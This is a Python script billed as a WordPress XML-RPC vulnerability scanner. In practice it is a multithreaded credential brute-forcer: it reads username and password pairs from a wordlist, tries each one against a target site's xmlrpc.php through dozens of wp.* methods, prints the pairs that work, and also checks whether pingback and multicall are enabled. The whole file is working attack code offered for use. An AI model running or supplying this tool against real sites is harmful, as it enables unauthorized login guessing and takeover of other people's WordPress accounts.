import argparse
import xmlrpc.client
import concurrent.futures

# Define function to parse command-line arguments
def parse_arguments():
    # Create argparse.ArgumentParser object
    parser = argparse.ArgumentParser(description="WordPress XMLRPC Vulnerability Scanner")
    # Add command-line arguments to parser
    parser.add_argument("-u", "--url", help="URL of the targeted site", required=True)
    parser.add_argument("-w", "--wordlist", help="Path to the wordlist file containing usernames and passwords", required=True)
    parser.add_argument("-t", "--threads", help="Number of threads to use for authentication", default=20, type=int)
    return parser.parse_args()

# Define function to test authentication for a given method
def test_authentication(method, server, username, password):
    try:
        getattr(server, method)("1", username, password)
        print(f"{method} allows authentication with {username}:{password}")
    except xmlrpc.client.Fault as err:
        if err.faultCode == 401:
            print(f"{method} authentication failed for {username}:{password}")
    except:
        print(f"An unexpected error occurred while testing credentials: {username}:{password}")

# Define function to determine which method to test for authentication or enablement, and call test_authentication() if necessary
def test_method(server, method, username, password):
    if method in ["pingback.ping", "system.multicall"]:
        try:
            getattr(server, method)()
            print(f"{method} is enabled.")
        except:
            pass
    else:
        test_authentication(method, server, username, password)

# Define main function
def main():
    # Parse command-line arguments
    args = parse_arguments()
    # Set up XML-RPC connection to given URL
    url = f"https://www.{args.url}/xmlrpc.php"
    server = xmlrpc.client.Server(url)
    # Check if XML-RPC is enabled
    try:
        server.system.listMethods()
    except:
        print("XMLRPC is disabled.")
        return
    # List allowed methods and create list of methods to test
    allowed_methods = server.system.listMethods()
    methods_to_check = [
        "wp.getUsersBlogs", "wp.getUsers", "wp.getProfile", "wp.getAuthors", "wp.getComments",
        "wp.getPageTemplates", "wp.getTaxonomies", "wp.getTerms", "wp.getPostFormats", "wp.getPostStatuses",
        "wp.getPostTypes", "wp.newCategory", "wp.newComment", "wp.newPage", "wp.newPost", "wp.editComment",
        "wp.editPage", "wp.editPost", "wp.deleteComment", "wp.deletePage", "wp.deletePost", "wp.getCommentCount",
        "wp.getPageList", "wp.getPost", "wp.getPage", "wp.getRecentPosts", "wp.getTags", "wp.getTerm",
        "wp.getTermsBy", "wp.getMediaItem", "wp.getMediaLibrary", "wp.getMediaItemMimeType", "wp.uploadFile"
    ]

    # Create a set of methods to check
    methods_set = set(methods_to_check)

    # Find the intersection of allowed methods and methods to check
    intersection = methods_set.intersection(allowed_methods)

    # If no intersection exists, print a message and return from the function
    if len(intersection) == 0:
        print("No methods for authentication available.")
        return

    # Open the wordlist file and read its lines
    with open(args.wordlist, 'r') as file:
        lines = file.read().splitlines()

    # Create a ThreadPoolExecutor to execute tests concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        # For each line in the wordlist
        for line in lines:
            # Get the username and password
            username, password = line.strip().split()
            # For each method in the intersection
            for method in intersection:
                # Submit a test method to the executor and store the returned Future object
                futures.append(executor.submit(test_method, server, method, username, password))
        
        # Wait for all the submitted tests to complete
        for future in concurrent.futures.as_completed(futures):
            # Do nothing with the result, just wait for it to complete
            pass

# If this module is being executed as the main program, call the main function
if __name__ == "__main__":
    main()
